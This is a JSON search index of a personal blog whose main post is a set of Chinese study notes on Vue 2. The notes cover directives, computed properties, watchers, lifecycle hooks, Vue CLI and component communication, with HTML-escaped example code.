{"meta":{"title":"Erickin","subtitle":"","description":"","author":"Erickin","url":"https://erickinyae.github.io","root":"/"},"pages":[{"title":"about","date":"2023-10-20T02:13:30.000Z","updated":"2023-11-05T14:40:20.000Z","comments":true,"path":"about/index.html","permalink":"https://erickinyae.github.io/about/index.html","excerpt":"","text":"努力学习 快乐生活！测试。"},{"title":"书单","date":"2023-11-09T05:17:20.605Z","updated":"2023-11-06T06:52:30.000Z","comments":false,"path":"books/index.html","permalink":"https://erickinyae.github.io/books/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-11-27T02:06:28.231Z","updated":"2023-11-06T06:52:30.000Z","comments":false,"path":"categories/index.html","permalink":"https://erickinyae.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-11-09T05:17:20.607Z","updated":"2023-11-06T06:52:30.000Z","comments":true,"path":"links/index.html","permalink":"https://erickinyae.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-11-09T05:17:20.608Z","updated":"2023-11-06T06:52:30.000Z","comments":false,"path":"repository/index.html","permalink":"https://erickinyae.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-11-27T02:06:43.925Z","updated":"2023-11-06T06:52:30.000Z","comments":false,"path":"tags/index.html","permalink":"https://erickinyae.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Vue","slug":"Vue","date":"2023-12-28T00:59:18.000Z","updated":"2024-01-03T02:51:46.183Z","comments":true,"path":"2023/12/28/Vue/","permalink":"https://erickinyae.github.io/2023/12/28/Vue/","excerpt":"","text":"差值表达式差值表达式是一种Vue的模板语法； 差值表达式不具备解析标签的能力； 1234567891011121314151617181920&lt;div id=&quot;app&quot;&gt; &lt;!--此处编写用于渲染的代码逻辑--&gt; &lt;div v-html=&quot;msg&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; //一旦引入了VueJS核心包，在全局环境，就有了Vue构造函数 const app = new Vue(&#123; //通过 el 配置选择器，指定vue管理的是哪个盒子 el: &#x27;#app&#x27;, //通过 data 提供数据 data: &#123; msg: ` hello world! ` &#125; &#125;)&lt;/script&gt; 差值表达式，数据改变，试图将自动更新，使用Vue开发，只需要专注业务核心逻辑即可。 作用：利用表达式进行插值，渲染到页面中； 表达式：是可以被求值的代码，Js引擎会将其计算出一个结果； 1234&lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;&lt;p&gt;&#123;&#123; nickname.toUpperCase() &#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;age &gt;= 18 ? &#x27;成年&#x27; : &#x27;未成年&#x27;&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123; obj.name &#125;&#125;&lt;/p&gt; 注意点： 使用的数据必须存在（data）； 支持的是表达式，而非语句，比如 if for…； 不能在标签属性中使用&#123;&#123; &#125;&#125;插值； 1&lt;p title=&quot;&#123;&#123; username &#125;&#125;&quot;&gt;我是p标签&lt;/p&gt; Vue指令Vue会根据不同的指令，针对标签实现不同的功能； 指令是指，带有v-前缀的特殊标签属性。 v-html动态地将data中绑定的文本按照html格式进行解析。 12345678910111213141516171819202122&lt;div id=&quot;app&quot;&gt; &lt;!--此处编写用于渲染的代码逻辑--&gt; &lt;div v-html=&quot;msg&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&quot;&gt;&lt;/script&gt; &lt;script&gt; //一旦引入了VueJS核心包，在全局环境，就有了Vue构造函数 const app = new Vue(&#123; //通过 el 配置选择器，指定vue管理的是哪个盒子 el: &#x27;#app&#x27;, //通过 data 提供数据 data: &#123; msg: ` &lt;a href=&quot;https://www.baidu.com&quot;&gt; 百度 &lt;/a&gt; ` &#125; &#125;) &lt;/script&gt; v-show 底层原理：切换css的 display: none 来控制显示和隐藏； 作用：控制元素的显示与隐藏； 语法：v-show=&quot;表达式&quot; 表达式值 true显示，false隐藏； 使用场景：频繁切换显示隐藏的场景 v-if 底层原理：根据 判断条件 控制元素的 创建 和 移除（条件渲染）； 作用：控制元素的显示与隐藏（条件渲染）； 语法：v-if=&quot;表达式&quot; 表达式值 true显示，false隐藏； 使用场景：要么显示、要么隐藏、不频繁切换的场景。 v-show和v-if的区别： 当v-show的boolean值和v-if的boolean值都为false时： 如果v-show为false，页面中还是会将该窗格进行渲染，只是会添加一个标签：style=&quot;display: none&quot;，使其隐藏起来； 如果v-if为false，页面中将不会渲染该窗格。 v-else和v-else-if 作用：辅助 v-if 进行判断渲染； 语法：v-else v-else-if &#x3D; “表达式”； 注意：需要紧挨着 v-if 一起使用。 123456789101112131415161718192021&lt;div id=&quot;app&quot;&gt; &lt;p v-if=&quot;gender === 1&quot;&gt;性别：♂ 男&lt;/p&gt; &lt;p v-else&gt;性别：♀ 女&lt;/p&gt; &lt;hr&gt; &lt;p v-if=&quot;score &gt;= 90&quot;&gt;成绩评定A：奖励电脑一台&lt;/p&gt; &lt;p v-else-if=&quot;score &gt;= 70&quot;&gt;成绩评定B：奖励周末郊游&lt;/p&gt; &lt;p v-else-if=&quot;score &gt;= 60&quot;&gt;成绩评定C：奖励零食礼包&lt;/p&gt; &lt;p v-else&gt;成绩评定D：惩罚一周不能玩手机&lt;/p&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; gender: 2, score: 95 &#125; &#125;)&lt;/script&gt; v-on 作用：注册事件 &#x3D; 添加监听 + 提供处理逻辑； 语法： v-on：事件名 &#x3D; “内联语句”； 12&lt;button v-on:click=&quot;count++&quot;&gt;按钮&lt;/button&gt;&lt;button @click=&quot;count++&quot;&gt;按钮&lt;/button&gt; v-on：事件名 &#x3D; “methods中的函数名”； 简写：@事件名v-on:click=“”可以简写为@click=“” 1234567891011121314&lt;div id=&quot;app&quot;&gt; &lt;button @click=&quot;count--&quot;&gt;-&lt;/button&gt; &lt;span&gt;&#123;&#123; count &#125;&#125;&lt;/span&gt; &lt;button v-on:click=&quot;count++&quot;&gt;+&lt;/button&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; count: 100 &#125; &#125;)&lt;/script&gt; 123456789101112131415161718192021&lt;div id=&quot;app&quot;&gt; &lt;button @click=&quot;fn&quot;&gt;切换显示隐藏&lt;/button&gt; &lt;h1 v-show=&quot;isShow&quot;&gt;黑马程序员&lt;/h1&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app4 = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; isShow: true &#125;, methods: &#123; fn () &#123; // 让提供的所有methods中的函数，this都指向当前实例 // console.log(&#x27;执行了fn&#x27;, app.isShow) // console.log(app3 === this) this.isShow = !this.isShow &#125; &#125; &#125;)&lt;/script&gt; v-on调用传参123456789101112131415161718192021222324&lt;div id=&quot;app&quot;&gt; &lt;div class=&quot;box&quot;&gt; &lt;h3&gt;小黑自动售货机&lt;/h3&gt; &lt;button @click=&quot;buy(5)&quot;&gt;可乐5元&lt;/button&gt; &lt;button @click=&quot;buy(10)&quot;&gt;咖啡10元&lt;/button&gt; &lt;button @click=&quot;buy(8)&quot;&gt;牛奶8元&lt;/button&gt; &lt;/div&gt; &lt;p&gt;银行卡余额：&#123;&#123; money &#125;&#125;元&lt;/p&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; money: 100 &#125;, methods: &#123; buy (price) &#123; this.money -= price &#125; &#125; &#125;)&lt;/script&gt; v-bind 作用：动态的设置html的标签属性 -&gt; src url title …，将数据绑定到视图上； 语法：v-bind:属性名&#x3D;“表达式”； 简写：v-bind:src=&quot;imgUrl&quot;可以简写为:src=&quot;imgUrl&quot;。 12&lt;img v-bind:src=&quot;imgUrl&quot; v-bind:title=&quot;msg&quot; alt=&quot;&quot;&gt;&lt;img :src=&quot;imgUrl&quot; :title=&quot;msg&quot; alt=&quot;&quot;&gt; 123456789101112131415&lt;div id=&quot;app&quot;&gt; &lt;!-- v-bind:src =&gt; :src --&gt; &lt;img v-bind:src=&quot;imgUrl&quot; v-bind:title=&quot;msg&quot; alt=&quot;&quot;&gt; &lt;img :src=&quot;imgUrl&quot; :title=&quot;msg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; imgUrl: &#x27;./imgs/10-02.png&#x27;, msg: &#x27;hello 波仔&#x27; &#125; &#125;)&lt;/script&gt; v-bind 操作 class 说明：对于样式控制的增强，操作class； 语法：:class=&quot;对象/数组&quot; 对象：键就是类名，值就是布尔值。如果值为true，有这个类，否则没有这个类。适用于一个类名，来回切换的场景。 数组：数组中所有的类，都会添加到盒子中，本质上就是一个class列表。适用于批量添加或删除类的场景。 1234567891011121314151617181920212223242526272829303132 &lt;style&gt; .box &#123; width: 200px; height: 200px; border: 3px solid #000; font-size: 30px; margin-top: 10px; &#125; .pink &#123; background-color: pink; &#125; .big &#123; width: 300px; height: 300px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;div class=&quot;box&quot; :class=&quot;&#123; pink: true, big: true &#125;&quot;&gt;黑马程序员&lt;/div&gt; &lt;div class=&quot;box&quot; :class=&quot;[&#x27;pink&#x27;, &#x27;big&#x27;]&quot;&gt;黑马程序员&lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; &#125; &#125;) &lt;/script&gt; Eg：tab栏点击即高亮的功能实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;style&gt; * &#123; margin: 0; padding: 0; &#125; ul &#123; display: flex; border-bottom: 2px solid #e01222; padding: 0 10px; &#125; li &#123; width: 100px; height: 50px; line-height: 50px; list-style: none; text-align: center; &#125; li a &#123; display: block; text-decoration: none; font-weight: bold; color: #333333; &#125; li a.active &#123; background-color: #e01222; color: #fff; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;(item, index) in list&quot; :key=&quot;item.id&quot; @click=&quot;activeIndex = index&quot;&gt; &lt;a :class=&quot;&#123; active: index === activeIndex &#125;&quot; href=&quot;#&quot;&gt;&#123;&#123; item.name &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; activeIndex: 2, // 记录高亮 list: [ &#123; id: 1, name: &#x27;京东秒杀&#x27; &#125;, &#123; id: 2, name: &#x27;每日特价&#x27; &#125;, &#123; id: 3, name: &#x27;品类秒杀&#x27; &#125; ] &#125; &#125;) &lt;/script&gt; v-for 作用：基于数据循环，多次渲染整个元素 -&gt; 数组、对象、数字…； 语法：v-for=&quot;(item, index) in 数组&quot;，item是数组的每一项。index是下标； 简写：省略index：v-for=&quot;item in 数组&quot; 123456789101112131415161718192021222324&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;小黑水果店&lt;/h3&gt; &lt;ul&gt; &lt;li v-for=&quot;(item, index) in list&quot;&gt; &#123;&#123; item &#125;&#125; - &#123;&#123; index &#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;ul&gt; &lt;li v-for=&quot;item in list&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; list: [&#x27;西瓜&#x27;, &#x27;苹果&#x27;, &#x27;鸭梨&#x27;, &#x27;榴莲&#x27;] &#125; &#125;)&lt;/script&gt; v-for 中的 Key 语法：key属性 &#x3D; “唯一标识”； 作用：给列表项添加的唯一标识，便于Vue进行列表项的正确排序复用； 注意点： key的值只能是字符串或数字类型； key的值必须具有唯一性； 推荐使用id作为key（唯一），不推荐使用index作为key（index会动态变化）。 1234567891011121314151617181920212223242526272829&lt;div id=&quot;app&quot;&gt; &lt;h3&gt;小黑的书架&lt;/h3&gt; &lt;ul&gt; &lt;li v-for=&quot;(item, index) in booksList&quot;&gt; &lt;span&gt;&#123;&#123; item.name &#125;&#125;&lt;/span&gt; &lt;span&gt;&#123;&#123; item.author &#125;&#125;&lt;/span&gt; &lt;button @click=&quot;del(item.id)&quot;&gt;删除&lt;/button&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; booksList: [ &#123; id: 1, name: &#x27;《红楼梦》&#x27;, author: &#x27;曹雪芹&#x27; &#125;, &#123; id: 2, name: &#x27;《西游记》&#x27;, author: &#x27;吴承恩&#x27; &#125;, &#123; id: 3, name: &#x27;《水浒传》&#x27;, author: &#x27;施耐庵&#x27; &#125;, &#123; id: 4, name: &#x27;《三国演义》&#x27;, author: &#x27;罗贯中&#x27; &#125; ] &#125;, methods: &#123; del (id) &#123; this.booksList = this.booksList.filter(item =&gt; item.id !== id) &#125; &#125; &#125;)&lt;/script&gt; v-model 作用：给表单元素使用，双向绑定 -&gt; 可以快速获取或设置表单元素的内容 数据变化 -&gt; 视图自动更新； 视图变化 -&gt; 数据自动更新； 语法：v-model&#x3D;’变量’; 12345678910111213141516171819202122232425262728293031&lt;div id=&quot;app&quot;&gt; &lt;!-- v-model 可以让数据和视图，形成双向数据绑定 (1) 数据变化，视图自动更新 (2) 视图变化，数据自动更新 可以快速[获取]或[设置]表单元素的内容 --&gt; 账户：&lt;input type=&quot;text&quot; v-model=&quot;username&quot;&gt; &lt;br&gt;&lt;br&gt; 密码：&lt;input type=&quot;password&quot; v-model=&quot;password&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;button @click=&quot;login&quot;&gt;登录&lt;/button&gt; &lt;button @click=&quot;reset&quot;&gt;重置&lt;/button&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; username: &#x27;&#x27;, password: &#x27;&#x27; &#125;, methods: &#123; login () &#123; console.log(this.username, this.password) &#125;, reset () &#123; this.username = &#x27;&#x27; this.password = &#x27;&#x27; &#125; &#125; &#125;)&lt;/script&gt; v-model应用于其他表单元素常见的表单元素都可以用v-model绑定关联 -&gt; 快速获取或设置表单元素的值 输入框：input:text 文本域：textarea 复选框：input:checkbox 单选框：input:radio 下拉菜单：select … 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; textarea &#123; display: block; width: 240px; height: 100px; margin: 10px 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;h3&gt;小黑学习网&lt;/h3&gt; 姓名： &lt;input type=&quot;text&quot; v-model=&quot;username&quot;&gt; &lt;br&gt;&lt;br&gt; 是否单身： &lt;input type=&quot;checkbox&quot; v-model=&quot;isSingle&quot;&gt; &lt;br&gt;&lt;br&gt; &lt;!-- 前置理解： 1. name: 给单选框加上 name 属性 可以分组 → 同一组互相会互斥 2. value: 给单选框加上 value 属性，用于提交给后台的数据 结合 Vue 使用 → v-model --&gt; 性别: &lt;input v-model=&quot;gender&quot; type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot;&gt;男 &lt;input v-model=&quot;gender&quot; type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;2&quot;&gt;女 &lt;br&gt;&lt;br&gt; &lt;!-- 前置理解： 1. option 需要设置 value 值，提交给后台 2. select 的 value 值，关联了选中的 option 的 value 值 结合 Vue 使用 → v-model --&gt; 所在城市: &lt;select v-model=&quot;cityId&quot;&gt; &lt;option value=&quot;101&quot;&gt;北京&lt;/option&gt; &lt;option value=&quot;102&quot;&gt;上海&lt;/option&gt; &lt;option value=&quot;103&quot;&gt;成都&lt;/option&gt; &lt;option value=&quot;104&quot;&gt;南京&lt;/option&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; 自我描述： &lt;textarea v-model=&quot;desc&quot;&gt;&lt;/textarea&gt; &lt;button&gt;立即注册&lt;/button&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt; &lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; username: &#x27;&#x27;, isSingle: false, gender: &quot;2&quot;, cityId: &#x27;102&#x27;, desc: &quot;&quot; &#125; &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 指令修饰符通过”.”指明了一些指令后缀，不同后缀封装了不同的处理操作，从而简化代码； 按键修饰符：@keyup.unter 按键回车监听； v-model修饰符： v-model.trim 去除首尾空格； v-model.number转数字； 事件修饰符： 事件名.stop阻止冒泡； 事件名.prevent阻止默认行为。 计算属性data: computed: {} 注意：计算属性对应的属性或对象将不在data中声明。 概念：基于现有的数据，计算出来的新属性，依赖的数据变化，自动重新计算； 语法：声明在computed配置项中，一个计算属性对应一个函数； 使用起来和普通属性一样使用 &#123;&#123; 计算属性名 &#125;&#125; computed计算属性和methods方法的区别： computed计算属性： 作用：封装了一段对于数据的处理，求得一个结果； 缓存特性：计算树形会对计算出来的结果缓存，再次使用直接读取缓存； methods方法： 作用：给实例提供一个方法，调用以处理业务逻辑； 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;div id=&quot;app&quot;&gt; 姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; + 名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; = &lt;span&gt;&#123;&#123; fullName &#125;&#125;&lt;/span&gt;&lt;br&gt;&lt;br&gt; &lt;button @click=&quot;changeName&quot;&gt;改名卡&lt;/button&gt;&lt;/div&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;script&gt; const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; firstName: &#x27;刘&#x27;, lastName: &#x27;备&#x27;, &#125;, methods: &#123; changeName () &#123; this.fullName = &#x27;黄忠&#x27; &#125; &#125;, computed: &#123; // 简写 → 获取，没有配置设置的逻辑 // fullName () &#123; // return this.firstName + this.lastName // &#125; // 完整写法 → 获取 + 设置 fullName: &#123; // (1) 当fullName计算属性，被获取求值时，执行get（有缓存，优先读缓存） // 会将返回值作为，求值的结果 get () &#123; return this.firstName + this.lastName &#125;, // (2) 当fullName计算属性，被修改赋值时，执行set // 修改的值，传递给set方法的形参 set (value) &#123; // console.log(value.slice(0, 1)) // console.log(value.slice(1)) this.firstName = value.slice(0, 1) this.lastName = value.slice(1) &#125; &#125; &#125; &#125;)&lt;/script&gt; watch侦听器（监视器） 作用：监视数据变化，执行一些业务逻辑 或 异步操作； 语法： 简单写法：简单类型数据，直接监视； 12345678watch: &#123; 数据属性名 (newValue, oldValue) &#123; 某些业务逻辑 或 异步操作; &#125;, &#x27;对象.属性名&#x27; (newValue, oldValue) &#123; 某些业务逻辑 或 异步操作; &#125;&#125; 完整写法：添加额外配置项。 123456789watch: &#123; 数据属性名: &#123; deep: true, //深度监视（监视对象中的每一个属性） immediate: true, //是否立刻执行一次handler handler (newValue) &#123; console.log(newValue) &#125; &#125;&#125; 12345678910111213141516171819202122232425const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; obj: &#123; words: &#x27;小黑&#x27;, lang: &#x27;italy&#x27; &#125;, result: &#x27;&#x27;, // 翻译结果 &#125;, watch: &#123; obj: &#123; deep: true, // 深度监视 immediate: true, // 立刻执行，一进入页面handler就立刻执行一次 handler (newValue) &#123; clearTimeout(this.timer) this.timer = setTimeout(async () =&gt; &#123; const res = await axios(&#123; url: &#x27;https://applet-base-api-t.itheima.net/api/translate&#x27;, params: newValue &#125;) this.result = res.data.data console.log(res.data.data) &#125;, 300) &#125; &#125; ​ Vue生命周期Vue生命周期是指，一个Vue实例从 创建 到 销毁 的整个过程。 生命周期四个阶段： 创建：Vue框架将静态数据修改为响应式数据，完成后就可以发送初始化渲染请求； 挂载：将数据挂载到模板中，再进行模板渲染，完成后就可以对dom进行操作了； 更新：更新阶段是个循环阶段，一旦数据发生修改，就进行视图的更新； 销毁：销毁实例。 Vue生命周期函数（钩子函数）Vue生命周期过程中，会自动运行一些函数，被称为【生命周期钩子】； 生命周期钩子可以让开发者在特定阶段运行自己的代码； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;script&gt; /** * 接口文档地址： * https://www.apifox.cn/apidoc/shared-24459455-ebb1-4fdc-8df8-0aff8dc317a8/api-53371058 * * 功能需求： * 1. 基本渲染 * 2. 添加功能 * 3. 删除功能 * 4. 饼图渲染 */ const app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; shoppingName: &quot;&quot;, shoppingPrice: &quot;&quot;, list: [] &#125;, computed: &#123; // 计算属性，计算并返回账单总价 totalCount() &#123; return this.list.reduce((sum, item) =&gt; sum + item.price, 0); &#125; &#125;, // created 钩子在 Vue 实例被创建后调用，但是在挂载到 DOM 之前。 // 常用于初始化设置，比如从 API 获取数据。 created() &#123; this.getList(); // 在实例创建后调用 getList 方法。 &#125;, methods: &#123; // ... 其他方法 ... // 从 API 获取账单数据的异步方法 async getList() &#123; const res = await axios.get(&#x27;https://applet-base-api-t.itheima.net/bill&#x27;, &#123; params: &#123; creator: &#x27;Eirc&#x27; &#125; &#125;); this.list = res.data.data; // 根据获取的数据设置饼图的选项 this.myChart.setOption(&#123; series: [ &#123; data: this.list.map(item =&gt; (&#123; value: item.price, name: item.name &#125;)) &#125; ] &#125;); &#125;, // ... 其他方法 ... &#125;, // mounted 钩子在 Vue 实例挂载到 DOM 后调用。 // 常用于需要访问 DOM 元素的操作，比如初始化第三方库或创建图表。 mounted() &#123; // 初始化 ECharts 实例并将其赋值给 myChart 属性。 this.myChart = echarts.init(document.querySelector(&#x27;#main&#x27;)); // 设置饼图的初始选项。 this.myChart.setOption(&#123; title: &#123; text: &#x27;消费账单列表&#x27;, left: &#x27;center&#x27; &#125;, tooltip: &#123; trigger: &#x27;item&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27; &#125;, series: [ &#123; name: &#x27;消费账单&#x27;, type: &#x27;pie&#x27;, radius: &#x27;50%&#x27;, // 半径 data: [], emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125; ] &#125;); &#125;, &#125;)&lt;/script&gt; Vue CLI 工程化开发 &amp; 脚手架使用步骤： 全局安装（一次）：yarm global add @vue/cli 或 npm install @vue/cli -g； 查看Vue版本：vue --version; 创建项目架子：vue create project-name（项目名-仅限英文）； 启动项目：yarn serve 或 npm run serve（找package.json）; 脚手架目录文件 组件化开发 &amp; 根组件组件化：一个页面可以拆分为一个个组件，每个组件有着独立的结构、样式和行为，目的是便于维护，利于复用，提升开发效率。 根组件：整个应用最上层的组件，包裹所有普通小组件。 App.vue文件（根组件）的三个组成部分整个应用最上层的组件，包裹所有普通小组件。一个根组件App.vue，包含三个部分： template：结构（有且仅有一个根元素）； script：js逻辑； style：css样式（可支持less，需要安装包）; style标签，lang&#x3D;“less”开启less功能； 装包：yarn add less less-loader 或 npm install less less-loader --save-dev 普通组件的注册使用组件注册的两种方式： 局部注册：只能在注册的组件内使用； 在components文件夹中创建.vue文件（三个组成部分）； 在使用的组件内导入并注册； 全局注册：所有组件内都能使用。 在components文件夹中创建.vue文件（三个组成部分）； 在main.js中进行全局注册； 使用：当成html标签使用：&lt;组件名&gt;&lt;/组件名&gt;； 注意：组件名规范 -&gt; 大驼峰命名法：如ErickinHeader； 局部注册实例： 文件结构 HmHeader.vue 12345678910111213141516171819202122&lt;template&gt; &lt;div class=&quot;hm-header&quot;&gt; 我是hm-header &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;&#125;&lt;/script&gt;&lt;style&gt;.hm-header &#123; height: 100px; line-height: 100px; text-align: center; font-size: 30px; background-color: #8064a2; color: white;&#125;&lt;/style&gt; App.vue 1234567891011121314151617181920212223242526272829303132333435363738&lt;template&gt; &lt;div class=&quot;App&quot;&gt; &lt;!-- 头部组件 --&gt; &lt;HmHeader&gt;&lt;/HmHeader&gt; &lt;!-- 主体组件 --&gt; &lt;HmMain&gt;&lt;/HmMain&gt; &lt;!-- 底部组件 --&gt; &lt;HmFooter&gt;&lt;/HmFooter&gt; &lt;!-- 如果 HmFooter + tab 出不来 → 需要配置 vscode 设置中搜索 trigger on tab → 勾上 --&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import HmHeader from &#x27;./components/HmHeader.vue&#x27;import HmMain from &#x27;./components/HmMain.vue&#x27;import HmFooter from &#x27;./components/HmFooter.vue&#x27;export default &#123; components: &#123; // &#x27;组件名&#x27;: 组件对象 HmHeader: HmHeader, HmMain, HmFooter &#125;&#125;&lt;/script&gt;&lt;style&gt;.App &#123; width: 600px; height: 700px; background-color: #87ceeb; margin: 0 auto; padding: 20px;&#125;&lt;/style&gt; 全局注册实例： main.js 123456789101112131415161718192021// 文件核心作用：导入App.vue，基于App.vue创建结构渲染index.htmlimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;// 编写导入的代码，往代码的顶部编写(规范)import HmButton from &#x27;./components/HmButton&#x27;Vue.config.productionTip = false// 进行全局注册 → 在所有的组件范围内都能直接使用// Vue.component(组件名，组件对象)Vue.component(&#x27;HmButton&#x27;, HmButton)// Vue实例化，提供render方法 → 基于App.vue创建结构渲染index.htmlnew Vue(&#123; // render: h =&gt; h(App), render: (createElement) =&gt; &#123; // 基于App创建元素结构 return createElement(App) &#125;&#125;).$mount(&#x27;#app&#x27;) Scoped解决样式冲突12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div class=&quot;base-one&quot;&gt; BaseOne &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;&#125;&lt;/script&gt;&lt;style scoped&gt;/* 1.style中的样式 默认是作用到全局的 2.加上scoped可以让样式变成局部样式 组件都应该有独立的样式，推荐加scoped（原理） ----------------------------------------------------- scoped原理： 1.给当前组件模板的所有元素，都会添加上一个自定义属性 data-v-hash值 data-v-5f6a9d56 用于区分开不通的组件 2.css选择器后面，被自动处理，添加上了属性选择器 div[data-v-5f6a9d56]*/div&#123; border: 3px solid blue; margin: 30px;&#125;&lt;/style&gt; 组件通信父子关系组件父传子：props props校验123456789101112131415161718192021222324252627282930&lt;script&gt;export default &#123; // 1.基础写法（类型校验） // props: &#123; // w: Number, // &#125;, // 2.完整写法（类型、默认值、非空、自定义校验） props: &#123; w: &#123; //类型校验 type: Number, //非空校验 required: true, //默认值 default: 0, //自定义校验 validator(val) &#123; // console.log(val) if (val &gt;= 100 || val &lt;= 0) &#123; console.error(&#x27;传入的范围必须是0-100之间&#x27;) return false &#125; else &#123; return true &#125; &#125;, &#125;, &#125;,&#125;&lt;/script&gt; 子传父：$emit 非父子关系组件eventbus provide&amp;inject 通用组件v-model本质上是语法糖，等同于value属性和input事件的缩写。 v-model：数据的双向绑定，data改变，视图随之改变；视图改变，data随时更新； :value=&quot;msg&quot;：将data中的msg数据绑定到视图中； @input=&quot;msg = $event.target.value&quot;：监听视图的变化，当视图变化产生新的值时，将其赋值给data中的msg； 表单类组件封装 父传子：数据应该是父组件props传递过来的，v-model拆解绑定数据； 其中，$event是从子组件传递上来的更新值； 子传父：监听输入，子传父传值给组件进行修改。 e.target.value是视图中变化的新值。 v-model简化代码父组件v-model简化代码， 实现子组件和父组件数据双向绑定； 子组件：props通过value接收，通过input实现事件触发； 父组件：v-model给组件直接绑定数据。 简写前： v-model简写后： .sync修饰符1.作用可以实现 子组件 与 父组件数据 的 双向绑定，简化代码 简单理解：子组件可以修改父组件传过来的props值 2.场景封装弹框类的基础组件， visible属性 true显示 false隐藏 3.本质.sync修饰符 就是 :属性名 和 @update:属性名 合写 